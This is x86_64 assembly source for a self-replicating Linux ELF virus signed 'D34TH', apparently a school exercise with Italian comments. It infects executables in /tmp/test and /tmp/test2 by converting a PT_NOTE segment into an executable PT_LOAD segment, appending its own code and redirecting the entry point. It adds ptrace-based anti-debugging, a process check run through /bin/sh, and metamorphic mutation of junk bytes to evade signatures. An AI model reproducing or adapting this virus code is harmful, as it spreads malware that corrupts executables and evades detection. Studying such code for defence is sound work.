; +--------+------------+--------+------+------+------+------+------+------+
; |  arch  | syscall NR | return | arg0 | arg1 | arg2 | arg3 | arg4 | arg5 |
; +--------+------------+--------+------+------+------+------+------+------+
; | x86    | eax        | eax    | ebx  | ecx  | edx  | esi  | edi  | ebp  |
; | x86_64 | rax        | rax    | rdi  | rsi  | rdx  | r10  | r8   | r9   |
; +--------+------------+--------+------+------+------+------+------+------+

; .-----------.-------.
; |   Stack   | bytes |
; :-----------+-------:
; | stat      |  4096 |
; :-----------+-------:
; | tot letto |     8 |
; :-----------+-------:
; | getdents  | 32768 |
; :-----------+-------:
; | fd dir    |     8 |
; :-----------+-------:
; | str dir2  |    16 |
; :-----------+-------:
; | str dir1  |    16 |
; '-----------'-------'

%define START_JUNK1 0x41
%define START_JUNK2 0x57
%define START_JUNK3 0x41
%define START_JUNK4 0x56
%define PUSH 0x50
%define ADD 0x83
%define ADD1 0xc0
%define ADD2 0xa
%define SUB 0x83
%define SUB1 0xe8
%define SUB2 0x1
%define XCHG 0x87
%define XCHG1 0xc0
%define POP 0x58
%define END_JUNK1 0x41
%define END_JUNK2 0x5e
%define END_JUNK3 0x41
%define END_JUNK4 0x5f

%macro JUNK 0
    db START_JUNK1, START_JUNK2, START_JUNK3, START_JUNK4, PUSH, ADD, ADD1, ADD2, SUB, SUB1, SUB2, XCHG, XCHG1, POP, END_JUNK1, END_JUNK2, END_JUNK3, END_JUNK4,
%endmacro

section .text
    global _start

_start:

    struc dirent
        .d_ino resb 8
        .d_off resb 8
        .d_reclen resb 2
        .d_type resb 1
        .d_name resb 8
    endstruc

    struc ehdr
        .e_ident        resb 16             ;    /* File identification. */
        .e_type         resb 2              ;    /* File type. */
        .e_machine      resb 2              ;    /* Machine architecture. */
        .e_version      resb 4              ;    /* ELF format version. */
        .e_entry        resb 8              ;    /* Entry point. */
        .e_phoff        resb 8              ;    /* Program header file offset. */
        .e_shoff        resb 8              ;    /* Section header file offset. */
        .e_flags        resb 4              ;    /* Architecture-specific flags. */
        .e_ehsize       resb 2              ;    /* Size of ELF header in bytes. */
        .e_phentsize    resb 2              ;    /* Size of program header entry. */
        .e_phnum        resb 2              ;    /* Number of program header entries. */
        .e_shentsize    resb 2              ;    /* Size of section header entry. */
        .e_shnum        resb 2              ;    /* Number of section header entries. */
        .e_shstrndx     resb 2              ;    /* Section name strings section. */
    endstruc

    struc phdr
        .p_type         resb 4              ;    /* Entry type. */
        .p_flags        resb 4              ;    /* Access permission flags. */
        .p_offset       resb 8              ;    /* File offset of contents. */
        .p_vaddr        resb 8              ;    /* Virtual address in memory image. */
        .p_paddr        resb 8              ;    /* Physical address (not used). */
        .p_filesz       resb 8              ;    /* Size of contents in file. */
        .p_memsz        resb 8              ;    /* Size of contents in memory. */
        .p_align        resb 8              ;    /* Alignment in memory and file. */
    endstruc

    mov rbp, rsp                            ; salvo stato attuale stack

    ; ----------------------- Anti-Debug -----------------------
    JUNK
    JUNK

    call check_debug
    cmp rax, 0
    je .pass_first_check

    JUNK
    JUNK

    mov rdi, 1
    lea rsi, [rel msg_debug]
    mov rdx, 12
    mov rax, 1
    syscall                                ; write(1, "DEBUGGING..\n", 12)

    JUNK
    JUNK

    jmp exit

    .pass_first_check:
    ; --------- Controllo se il processo cat è attivo ----------
    call check_process
    cmp eax, 1
    je .pass_second_check
    jne exit
    ; ----------------------------------------------------------

    JUNK
    JUNK

    .pass_second_check:
    sub rsp, 16                             ; riservo spazio per /tmp/test
    mov dword [rsp+8], `t/\0\0`
    mov dword [rsp+4], '/tes'
    mov dword [rsp], '/tmp'

    JUNK
    JUNK

    sub rsp, 16                             ; riservo spazio per /tmp/test2
    mov dword [rsp+8], `t2/\0`
    mov dword [rsp+4], '/tes'
    mov dword [rsp], '/tmp'

    mov rdi, rsp
    add rdi, 16                             ; passo come argomento /tmp/test/
    call chdir                              ; chdir
    cmp rax, 0
    jl exit

    JUNK
    JUNK

    mov rsi, 0
    call open                               ; open /tmp/test/
    cmp rax, 0
    jl exit
    push rax                                ; salvo nello stack fd cartella

    JUNK
    JUNK

    sub rsp, 32768                          ; riservo spazio nello stack per lettura getdents64
    mov rsi, rsp                            ; passo come argomento lo spazio riservato
    mov rdi, [rsp+32768]
    call getdents64
    push rax                                ; salvo nello stack totale letto da getdents64

    JUNK
    JUNK

    mov rdi, [rsp+32768+8]
    call closefd                            ; chiudo fd cartella

    JUNK
    JUNK

    sub rsp, 4096                           ; riservo spazio per stat
    mov r10, rsp                            ; r10 = puntatore stat
    mov rdi, rsp
    add rdi, 4104                           ; rdi = puntatore struct
    call loop_indir

    JUNK
    JUNK

    ;test2
    mov rdi, rsp
    add rdi, 36880                          ; passo come argomento /tmp/test2/
    call chdir                              ; chdir
    cmp rax, 0
    jl exit

    JUNK
    JUNK

    mov rsi, 0
    call open                               ; open
    cmp rax, 0
    jl exit
    mov [rsp+4096+8+32768], rax             ; salvo fd

    JUNK
    JUNK

    mov rdi, [rsp+4096+8+32768]             ; rdi = fd
    mov rsi, rsp
    add rsi, 4104                           ; rsi = spazio riservato
    call getdents64                         ; getdents64
    mov [rsp+4096], rax                     ; salvo quantità letta

    JUNK
    JUNK

    mov rdi, [rsp+4096+8+32768]             ; fd da chiudere
    call closefd                            ; close

    mov r10, rsp                            ; r10 = struttura stat
    mov rdi, rsp
    add rdi, 4104                           ; rdi = dati letti da getdents64
    call loop_indir

    JUNK
    JUNK

    jmp exit

open:                                       ; rdi = fd, rsi = permessi
    mov rdx, 0                              ; flag
    mov rax, 2
    syscall
    ret

getdents64:                                 ; rdi = fd, rsi = spazio riservato
    mov rdx, 32768                          ; quantità da leggere
    mov rax, 217
    syscall
    ret

closefd:                                    ; rdi = fd
    mov rax, 3
    syscall
    ret

loop_indir:                                 ; rdi = ptr struct, r10 = puntatore buffer
    mov rax, [rsp+4096+8]                   ; rax = tot letto
    .loop:
        mov rsi, [rdi+dirent.d_name]        ; ptr + d_name
        cmp esi, 0x002e2e                   ; controllo se si tratta di '..'
        je .continue
        cmp si, 0x002e                      ; controllo se si tratta di '.'
        je .continue

    .check:
        push rax
        push rdi
        push rsi
        push rdx
        push r10
        mov rdi, rdi
        add rdi, dirent.d_name              ; rdi = ptr nome file
        mov rsi, r10                        ; spazio per la struttura
        mov rax, 4                          ; stat
        syscall
        cmp rax, 0
        jl .restore
        xor rax, rax
        mov rcx, [rsi+24]                   ; rcx = st_mode
        mov si, 1                           ; rsi = 1
        test rcx, 1b                        ; verifico la flag se è eseguibile
        cmove ax, si                        ; ax == 0 è eseguibile
        cmp ax, 0
        jne .restore

        .infect:
            call infect_file                ; rdi = ptr nome file
            pop r10
            pop rdx
            pop rsi
            pop rdi
            pop rax
            jmp .continue

        .restore:
            pop r10
            pop rdx
            pop rsi
            pop rdi
            pop rax
    .continue:
        mov dx, [rdi+dirent.d_reclen]
        add rdi, rdx
        sub rax, rdx
        cmp rax, 0
        je .end
        jmp .loop
    .end:
        ret

chdir:
    mov rax, 80
    syscall
    ret

lseek:                                      ; rdi = fd, rsi = offset, rdx = flag
    mov rax, 8
    syscall
    ret

mmap:                                       ; rsi = size, r8 = fd
    xor rdi, rdi
    mov rdx, 3
    mov r10, 1
    xor r9, r9
    mov rax, 9
    syscall
    ret

infect_file:                                ; rdi = ptr nome file
    ; open
    mov rsi, 1026                           ; permessi per open
    call open                               ; rax = fd
    cmp rax, 0
    jl .ret                                 ; se fd < 0 allora ret
    mov [rsp+36920], rax
    ; lseek
    push rax
    push rdi
    mov rdi, rax
    xor rsi, rsi
    mov rdx, 2
    call lseek
    mov rsi, rax                            ; rsi = size file
    pop rdi
    pop rax
    ; mmap
    mov r8, rax
    push rax
    call mmap
    cmp rax, 0
    jb exit
    mov r10, rax                            ; r10 = ptr map
    pop rax
    ; infect
    mov rcx, [r10+ehdr.e_phoff]
    add rcx, r10                            ; rcx = phdr
    xor r12, r12
    mov r12w, [r10+ehdr.e_phnum]            ; r12 = phnum
    mov rax, -1
    .loop:
        inc rax
        mov dl, [rcx+phdr.p_type]
        cmp dl, 4                           ; p_type == PT_NOTE
        je .finded
        add rcx, 56
        cmp rax, r12
        jb .loop
    .end:
; close
        mov rdi, [rsp+36920]
        call closefd
; ret
    .ret:
        ret

    .finded:                                ; rcx = ptr section PT_NOTE
        mov dword [rcx+phdr.p_type], 1      ; PT_LOAD
        mov dword [rcx+phdr.p_flags], 7     ; PF_R | PF_X | PF_W
        lea r12, [rel end_offset]
        lea rax, [rel _start]
        sub r12, rax                        ; r12 = size payload
        mov qword [rcx+phdr.p_offset], rsi  ; p_offset = size file
        add rsi, 0xc000000                  ; rsi = 0xc000000 + size file
        mov qword [rcx+phdr.p_vaddr], rsi   ; p_vaddr = rsi
        add qword [rcx+phdr.p_filesz], r12  ; p_filesz += size payload
        add qword [rcx+phdr.p_memsz], r12   ; p_memsz += size payload
        xor rcx, rcx
        mov ecx, dword [r10+ehdr.e_entry]   ; ecx = e_entry
        sub ecx, esi                        ; ecx -= p_vaddr
        sub ecx, r12d                       ; ecx -= size payload
        ; ecx = (uint32_t)offsetJump
        mov [r10+ehdr.e_entry], esi         ; e_entry = p_vaddr
    ; write payload
        mov rdi, [rsp+36920]                ; rdi = fd file
        lea rsi, [rel _start]
        mov rdx, r12
        mov rax, 1
        push rcx                            ; salvo ecx prima della syscall
        syscall
    ; write jmp per payload
        pop rcx                             ; ripristino ecx
        sub rsp, 5
        mov dword [rsp+1], ecx
        mov byte [rsp], 0xe9

        mov rsi, rsp
        mov rdx, 5
        mov rax, 1
        syscall
        add rsp, 5

    .fingerprint:
        ; rimuovo la flag O_APPEND
        mov rdi, [rsp+36920]
        mov rsi, 3
        xor rdx, rdx
        mov rax, 72                         ; fcntl(fd, F_GETFL, 0)
        syscall

        mov dx, 1024
        not dx                              ; ~flag
        and rdx, rax                        ; rddx = ~flag ^ oldflag
        mov rdi, [rsp+36920]
        mov rsi, 4
        mov rax, 72                         ; fcntl(fd, F_SETFL, flags)
        syscall

        call gettime
        push rax

        mov rax, [rsp+36928]
        call xorfile
        mov word [rsp], ax

        mov rdi, [rsp+36928]
        xor rsi, rsi
        mov rdx, 2                          ; SEEK_END
        call lseek                          ; lseek
        sub rax, 87

        mov rdi, [rsp+36928]
        mov rsi, rax
        xor rdx, rdx                        ; SEEK_SET
        call lseek                          ; lseek

        mov rdi, [rsp+36928]
        mov rsi, rsp
        mov rdx, 8
        mov rax, 1
        syscall                             ; write
        pop rax

    .metamorph:
        mov rdi, [rsp+36920]
        xor rsi, rsi
        mov rdx, 2                          ; SEEK_END
        call lseek

        mov rsi, rax
        mov r8, [rsp+36920]
        call mmap
        add rax, rsi                        ; aggiungo al puntatore la dimensione del file
        lea rcx, [rel end_offset]
        lea rsi, [rel _start]
        sub rcx, rsi
        sub rax, rcx                        ; sottraggo al puntatore la dimensione del payload
        sub rax, 5                          ; sottraggo al puntatore la dimensione del jmp
        mov r8, rax                         ; r8 = *map
        ;add rcx, 5
        mov r9, rcx                         ; r9 = tot da analizzare

        mov r10, -1                         ; r10 = contatore
        .meta_loop:
            add r10, 1
            xor rdi, rdi
            mov edi, dword [r8+r10]
            cmp edi, 0x56415741
            jne .continue
            .check_add:
                cmp byte [r8+r10+5], 0x83
                jne .continue
            .check_sub:
                cmp byte [r8+r10+8], 0x83
                jne .continue
            .check_xchg:
                cmp byte [r8+r10+11], 0x87
                je .meta
            .continue:
                cmp r10, r9
                jl .meta_loop
                jge .meta_end

        .meta:
            sub rsp, 1
            .rand:
                mov rdi, rsp
                mov rsi, 1
                mov rdx, 0
                mov rax, 318                ; getrandom(rsp, 1, 0)
                syscall

                mov al, [rsp]
                xor rsi, rsi
                mov si, 8
                div si
                cmp dl, 4
                je .rand
                cmp dl, 5
                je .rand
                                            ; (rdx)dl = [0...7] tranne 4 o 5
            add rsp, 1

            xor rdi, rdi
            mov dil, 0x50
            add dil, dl
            mov byte [r8+r10+4], dil        ; modifico PUSH 0x50 + dl

            xor rdi, rdi
            mov dil, 0xc0
            add dil, dl
            mov byte [r8+r10+6], dil        ; modifico ADD1 0xc0 + dl

            add dil, 0x28
            mov byte [r8+r10+9], dil        ; modifico SUB1 0xc0 + 0x28 + dl

            sub dil, 0x28
            mov byte [r8+r10+12], dil        ; modifico XCHG1 0xc0 + dl

            xor rdi, rdi
            mov dil, 0x58
            add dil, dl
            mov byte [r8+r10+13], dil        ; modifico POP 0x58 + dl

            jmp .meta_loop

            .meta_end:
                xor r9, r9
                xor r10, r10
                jmp .end

msg_debug:
    db 'DEBUGGING..', 0xA, 0x00

xorfile:                                    ; rax = fd
    mov rdi, rax
    push rax
    xor rsi, rsi
    mov rdx, 2
    call lseek

    mov rsi, rax                            ; rsi = size
    pop r8                                  ; r8 = fd
    call mmap
    mov rdi, rax                            ; rdi = *map

    mov rcx, -1
    xor rax, rax
    .loop:
        inc rcx
        xor al, byte [rdi+rcx]
        cmp rcx, rsi
        jl .loop
    mov ecx, 10                             ; base 10
    push rcx
    mov rsi, rsp                            ; rsi = str_num
    mov r10, -1
    .toascii:
        inc r10
        xor edx, edx
        div ecx
        add edx, '0'
        dec rsi
        mov [rsi], dl
        cmp r10, 3
        jl .toascii
    mov eax, dword [rsi]
    add rsp, 8
    ret

gettime:
    sub rsp, 16
    mov rdi, rsp                            ; rdi = timeval
    sub rsp, 8
    mov rsi, rsp                            ; rsi = timezone
    mov rax, 96
    syscall                                 ; gettimeofday

    mov eax, dword [rdi+8]                  ; eax = num
    mov ecx, 10                             ; base 10
    push rcx
    mov rsi, rsp                            ; rsi = str_num
    mov r10, -1
    .toascii:
        inc r10
        xor edx, edx
        div ecx
        add edx, '0'
        dec rsi
        mov [rsi], dl
        cmp r10, 7
        jl .toascii
    mov rax, [rsi]
    add rsp, 32
    ret

strlen:
    mov rax, -1                             ;i = -1
    .loop:                                  ;while
        inc rax                             ;i++
        cmp byte [rdi + rax], 0             ;if str[i] != 0
        jne .loop                           ;continue loop
    ret                                     ;return i

strcmp:
    mov rax, -1                             ;i = -1
    .loop:                                  ;while
        inc rax                             ;i++
        mov cl, byte [rdi + rax]            ;cl = first[i]
        mov dl, byte [rsi + rax]            ;dl = second[i]
        cmp cl, 0                           ;if cl == 0
        je .end                             ;then exit
        cmp dl, 0                           ;if dl == 0
        je .end                             ;then exit
        cmp cl, dl                          ;cl compare dl
        je .loop                            ;cl == dl then loop
        jmp .end                            ;else end
    .end:
        cmp cl, dl                          ;cl compare dl
        je .equal                           ;if cl == dl
        jb .negative                        ;if cl < dl
        ja .positive                        ;if cl > dl
    .equal:
        mov rax, 0                          ;return 0
        ret
    .negative:
        mov rax, -1                         ;return -1
        ret
    .positive:
        mov rax, 1                          ;return 1
        ret

check_process:
    ; int status = 0;
    sub rsp, 8

    ; rax = fork()
    mov rax, 57
    syscall
    cmp rax, 0
    ; if rax == 0
    je .figlio
    ; else
        ;wait4(pid, 0, 0, 0)
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0
    mov r10, 0
    mov rax, 61
    syscall

    xor rsi, rsi
    xor rdi, rdi
    mov esi, 1

    mov rax, [rsp]
    bt rax, 8
    ;jc .non_attivo
    cmovc eax, esi
    cmovnc eax, edi
    add rsp, 8
    ret

    .figlio:
        ; close(1)
        mov rdi, 1
        mov rax, 3
        syscall
        ; close(2)
        mov rdi, 2
        mov rax, 3
        syscall
        ; rdi = '/bin/sh\0'
        sub rsp, 12
        mov dword [rsp+4], `/sh\0`
        mov dword [rsp], '/bin'
        mov rdi, rsp

        ; rsi = '-c'
        sub rsp, 8
        mov dword [rsp], `-c\0\0`
        mov rsi, rsp

        ; rdx = 'pidof -s cat'
        sub rsp, 20
        mov dword [rsp+12], `\0\0\0\0`
        mov dword [rsp+8], ' cat'
        mov dword [rsp+4], 'f -s'
        mov dword [rsp], 'pido'
        mov rdx, rsp

        ; r10 = 0
        xor rax, rax
        push rax
        mov r10, rsp

        ; rsi = argv per execve
        sub rsp, 40
        mov qword [rsp+24], r10
        mov qword [rsp+16], rdx
        mov qword [rsp+8], rsi
        mov qword [rsp], rdi
        mov rsi, rsp

        xor rdx, rdx
        ; execve
        mov rax, 59
        syscall

    .exit:
        mov rdi, 0
        mov rax, 60
        syscall

check_debug:
    sub rsp, 8                              ; res = 0
    sub rsp, 8                              ; status = 0
    ; +----------------+---+
    ; | stack funzione |   |
    ; +----------------+---+
    ; | status         | 8 |
    ; | res            | 8 |
    ; +----------------+---+
    mov rax, 57                             ; rax = fork()
    syscall
    cmp rax, 0                              ; if rax == 0
    je .figlio                              ; allora vai al figlio

    .padre:                                 ; altrimenti padre
        mov rdi, rax
        mov rsi, rsp
        mov rdx, 0
        mov r10, 0
        mov rax, 61
        syscall                             ; wait4(pid, &status, 0, 0)
        mov rax, [rsp]                      ; rax = status

        mov esi, 1
        xor rdi, rdi
        bt rax, 8
        cmovc eax, esi
        cmovnc eax, edi

        add rsp, 16                         ; ripristino stack
        ret

    .figlio:
        sub rsp, 8                          ; int ppid = 0
        ; +----------------+---+
        ; | stack funzione |   |
        ; +----------------+---+
        ; | ppid           | 8 |
        ; | status         | 8 |
        ; | res            | 8 |
        ; +----------------+---+
        mov rax, 110
        syscall                             ; rax = getppid()
        mov [rsp], rax

        mov rdi, 16                         ; PTRACE_ATTACH
        mov rsi, [rsp]                      ; ppid
        mov rdx, 0
        mov r10, 0
        mov rax, 101                        ; ptrace(PTRACE_ATTACH, ppid, 0, 0)
        syscall
        cmp rax, 0
        jne .debug_presente

        .debug_non_presente:
            mov rdi, [rsp]
            mov rsi, 0
            mov rdx, 0
            mov r10, 0
            mov rax, 61
            syscall                         ; wait4(ppid, 0, 0, 0)

            mov rdi, 7                      ; PTRACE_CONT
            mov rsi, 0
            mov rdx, 0
            mov r10, 0
            mov rax, 101                    ; ptrace(PTRACE_CONT, 0, 0, 0)
            syscall

            mov rdi, 17                     ; PTRACE_DETACH
            mov rsi, [rsp]                  ; ppid
            mov rdx, 0
            mov r10, 0
            mov rax, 101                    ; ptrace(PTRACE_DETACH, ppid, 0, 0)
            syscall

            mov rcx, 0
            mov [rsp+8+8], rcx              ; res = 0
            jmp .exit

        .debug_presente:
            mov rcx, 1
            mov [rsp+8+8], rcx              ; res = 1

        .exit:
            mov rdi, [rsp+8+8]
            mov rax, 60
            syscall                         ; exit(res)

firma:
    db 'D34TH version 1.0 (c)oded by usavoia-usavoia - 42424242', 0x00

exit:
    mov rdi, [rbp + 8 * 1]                  ; rdi = ptr filename
    call strlen
    cmp rax, 5
    jl .exit_payload

    add rdi, rax                            ; rdi += len
    sub rdi, 5                              ; rdi -= 3

    sub rsp, 16                              ; riservo spazio per 'Death'
    mov dword [rsp+4], `h\0\0\0`
    mov dword [rsp], `Deat`
    mov rsi, rsp                            ; rsi = ptr a 'Death'
    call strcmp
    cmp rax, 0                              ; se non si tratta di 'Death'
    jne .exit_payload                       ; allora .exit_payload

    .exit_war:
        mov rsp, rbp                        ; ripristino lo stack
        mov rdi, 0                          ; error code
        mov rax, 60
        syscall

    .exit_payload:
        mov rsp, rbp                        ; ripristino lo stack

end_offset: